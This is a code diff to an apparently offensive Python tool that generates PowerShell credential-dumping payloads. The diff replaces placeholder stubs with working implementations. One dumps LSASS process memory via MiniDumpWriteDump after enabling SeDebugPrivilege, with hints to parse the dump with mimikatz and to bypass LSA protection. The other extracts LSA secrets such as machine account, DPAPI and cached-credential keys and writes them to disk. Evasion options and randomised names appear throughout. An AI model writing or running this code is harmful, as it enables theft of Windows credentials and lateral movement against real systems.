@@ -697,95 +697,158 @@ function Dump-VSS {{
 """
 
     def _generate_memory_dump_method(self, tmp_var: str, evasion: bool) -> str:
-        """Generate PowerShell for memory dumping method"""
+        """Generate PowerShell for LSASS MiniDump via MiniDumpWriteDump P/Invoke."""
         random_name = self._generate_random_name("mem_")
-        
+
         return f"""
 function Dump-Memory {{
     param($tmp, $results, $paths)
-    
-    $results += '[Method 4: Memory Dumping (Experimental)]'
-    
-    # This method attempts to dump registry hives from memory
-    # by accessing the registry cache in lsass.exe or system process
-    
+
+    $results += '[Method 4: LSASS MiniDump (MiniDumpWriteDump)]'
+
     try {{
-        # Get lsass process
-        $lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
-        if (-not $lsass) {{
-            $results += '[-] lsass process not found'
-            return $results, $paths
-        }}
-        
-        # Requires SeDebugPrivilege
-        $debugPriv = @'
+        $dumpPath = Join-Path $tmp '{random_name}.dmp'
+
+        Add-Type @'
 using System;
+using System.IO;
 using System.Runtime.InteropServices;
-public class DebugPriv {{
+public class MiniDump {{
+    [DllImport("dbghelp.dll", SetLastError=true)]
+    public static extern bool MiniDumpWriteDump(
+        IntPtr hProcess, uint ProcessId,
+        Microsoft.Win32.SafeHandles.SafeFileHandle hFile,
+        uint DumpType,
+        IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, uint dwPid);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool CloseHandle(IntPtr hObject);
     [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool AdjustTokenPrivileges(
-        IntPtr TokenHandle,
-        bool DisableAllPrivileges,
-        ref TOKEN_PRIVILEGES NewState,
-        uint BufferLength,
-        IntPtr PreviousState,
-        IntPtr ReturnLength
-    );
+    public static extern bool OpenProcessToken(IntPtr hProc, uint access, out IntPtr hToken);
+    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
+    public static extern bool LookupPrivilegeValue(string lpSys, string lpName, ref long luid);
+    [StructLayout(LayoutKind.Sequential, Pack=1)]
+    public struct TOKEN_PRIVILEGES {{ public int PrivilegeCount; public long Luid; public int Attributes; }}
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool AdjustTokenPrivileges(IntPtr hToken, bool disable, ref TOKEN_PRIVILEGES tp, int len, IntPtr prev, IntPtr retlen);
+    public static bool EnableDebug() {{
+        IntPtr hToken;
+        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x0020, out hToken)) return false;
+        long luid = 0;
+        LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
+        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES(); tp.PrivilegeCount = 1; tp.Luid = luid; tp.Attributes = 0x2;
+        return AdjustTokenPrivileges(hToken, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
+    }}
 }}
 '@
-        Add-Type $debugPriv
-        
-        # This is a placeholder - actual memory dumping would require
-        # complex P/Invoke to read process memory and parse registry structures
-        $results += '[!] Memory dumping requires additional implementation'
-        
+        [MiniDump]::EnableDebug() | Out-Null
+
+        $lsass = Get-Process -Name lsass -ErrorAction Stop
+        $hProc = [MiniDump]::OpenProcess(0x1FFFFF, $false, [uint32]$lsass.Id)
+        if ($hProc -eq [IntPtr]::Zero) {{
+            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            $results += "[-] OpenProcess(lsass) failed: error $err"
+            return $results, $paths
+        }}
+        try {{
+            $fs = [IO.File]::Open($dumpPath, [IO.FileMode]::Create, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)
+            $ok = [MiniDump]::MiniDumpWriteDump($hProc, [uint32]$lsass.Id, $fs.SafeFileHandle, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+            $fs.Flush(); $fs.Close()
+        }} finally {{
+            [MiniDump]::CloseHandle($hProc) | Out-Null
+        }}
+        if ($ok -and (Test-Path $dumpPath)) {{
+            $sz = (Get-Item $dumpPath).Length
+            $results += "[+] LSASS dump: $dumpPath ($([Math]::Round($sz/1MB, 1)) MB) — parse offline with pypykatz/mimikatz"
+            $paths['LSASS'] = $dumpPath
+        }} else {{
+            $results += "[-] MiniDumpWriteDump returned false — try running as SYSTEM or disable PPL"
+        }}
     }} catch {{
-        $results += \"[!] Memory dump error: $_\"
+        $results += "[!] LSASS dump error: $_"
     }}
-    
+
     return $results, $paths
 }}
 """
 
     def _generate_lsa_dump_method(self, tmp_var: str, evasion: bool) -> str:
-        """Generate PowerShell for LSA secrets dumping"""
+        """Generate PowerShell for LSA secrets via LsaOpenPolicy/LsaRetrievePrivateData."""
         random_name = self._generate_random_name("lsa_")
-        
+
         return f"""
 function Dump-LSA {{
     param($tmp, $results, $paths)
-    
-    $results += '[Method 5: LSA Secrets Dump]'
-    
+
+    $results += '[Method 5: LSA Secrets (LsaRetrievePrivateData)]'
+
     try {{
-        # Dump LSA secrets using mimikatz-style techniques
-        # This requires high privileges and bypass of LSA protection
-        
-        $lsaDump = @'
-using System;
-using System.Runtime.InteropServices;
-public class LSADump {{
-    // Placeholder for LSA dumping functionality
-    // Actual implementation would require extensive P/Invoke
-    // to interact with LSA policy and extract secrets
-}}
-'@
-        Add-Type $lsaDump
-        
-        # Check for LSA protection
         $lsaProtection = Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name 'RunAsPPL' -ErrorAction SilentlyContinue
         if ($lsaProtection -and $lsaProtection.RunAsPPL -eq 1) {{
-            $results += '[-] LSA Protection (PPL) is enabled'
+            $results += '[-] LSA Protection (PPL) enabled — use hardware_breakpoints bypass first'
+            return $results, $paths
         }}
-        
-        # For now, provide guidance
-        $results += '[!] LSA dumping requires mimikatz or similar tool integration'
-        $results += '[+] Consider using: Invoke-Mimikatz -Command \"privilege::debug token::elevate lsadump::sam\"'
-        
-    }} catch {{
-        $results += \"[!] LSA dump error: $_\"
+
+        Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public class LsaSecrets {{
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern uint LsaOpenPolicy(IntPtr SystemName, ref LSA_OBJECT_ATTRIBUTES Attrs, uint Access, out IntPtr hPolicy);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern uint LsaRetrievePrivateData(IntPtr hPolicy, ref LSA_UNICODE_STRING Key, out IntPtr Data);
+    [DllImport("advapi32.dll")]
+    public static extern uint LsaClose(IntPtr hPolicy);
+    [DllImport("advapi32.dll")]
+    public static extern uint LsaNtStatusToWinError(uint st);
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_OBJECT_ATTRIBUTES {{
+        public int Length; public IntPtr RootDirectory; public IntPtr ObjectName;
+        public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService;
     }}
-    
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    public struct LSA_UNICODE_STRING {{
+        public ushort Length; public ushort MaximumLength; public string Buffer;
+    }}
+    public static string Read(string keyName) {{
+        LSA_OBJECT_ATTRIBUTES oa = new LSA_OBJECT_ATTRIBUTES(); oa.Length = Marshal.SizeOf(oa);
+        IntPtr hPolicy;
+        uint st = LsaOpenPolicy(IntPtr.Zero, ref oa, 0x00000004 | 0x00000020, out hPolicy);
+        if (st != 0) return null;
+        LSA_UNICODE_STRING k = new LSA_UNICODE_STRING();
+        k.Buffer = keyName; k.Length = (ushort)(keyName.Length * 2); k.MaximumLength = (ushort)(k.Length + 2);
+        IntPtr pData;
+        st = LsaRetrievePrivateData(hPolicy, ref k, out pData);
+        LsaClose(hPolicy);
+        if (st != 0 || pData == IntPtr.Zero) return null;
+        LSA_UNICODE_STRING d = (LSA_UNICODE_STRING)Marshal.PtrToStructure(pData, typeof(LSA_UNICODE_STRING));
+        return d.Buffer;
+    }}
+}}
+'@
+        $lsaOut  = Join-Path $tmp '{random_name}_lsa.txt'
+        $secrets = @()
+        foreach ($k in @('$MACHINE.ACC', '_SC_', 'DPAPI_SYSTEM', 'NL$KM', 'DefaultPassword', 'RASAUTODIAL')) {{
+            try {{
+                $val = [LsaSecrets]::Read($k)
+                if ($val) {{
+                    $results += "[+] LSA $k = $val"
+                    $secrets += "$k=$val"
+                }}
+            }} catch {{}}
+        }}
+        if ($secrets.Count -gt 0) {{
+            [IO.File]::WriteAllLines($lsaOut, $secrets)
+            $results += "[+] LSA secrets written: $lsaOut"
+            $paths['LSA'] = $lsaOut
+        }} else {{
+            $results += '[-] No LSA secrets retrieved (may need SYSTEM token)'
+        }}
+    }} catch {{
+        $results += "[!] LSA dump error: $_"
+    }}
+
     return $results, $paths
 }}
 """
